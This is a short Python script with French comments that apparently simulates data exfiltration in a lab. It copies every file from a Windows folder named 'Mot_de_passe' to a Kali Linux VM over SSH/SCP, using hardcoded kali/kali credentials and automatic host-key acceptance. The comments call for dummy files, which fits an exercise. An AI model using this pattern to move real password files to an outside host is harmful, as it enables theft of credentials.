import os
from paramiko import SSHClient, AutoAddPolicy
from scp import SCPClient

def send_files_to_vm():
    # Chemin du répertoire contenant les fichiers à envoyer
    directory = r"C:\Mot_de_passe"  # Créez ce dossier et placez-y des fichiers fictifs

    # Configuration de la VM Linux
    vm_ip = "192.168.128.136"  # Remplacez par l'IP de votre VM Linux
    vm_user = "kali"         # Nom d'utilisateur de votre VM
    vm_password = "kali" # Mot de passe de votre VM
    vm_target_dir = "/home/kali/reception_test"  # Répertoire cible sur la VM

    # Initialisation de la connexion SSH
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    ssh.connect(vm_ip, username=vm_user, password=vm_password)

    # Utilisation de SCP pour envoyer les fichiers
    with SCPClient(ssh.get_transport()) as scp:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                print(f"Envoi de {file_path} vers la VM...")
                scp.put(file_path, vm_target_dir)

    print("Transfert terminé !")
    ssh.close()

if __name__ == "__main__":
    send_files_to_vm()
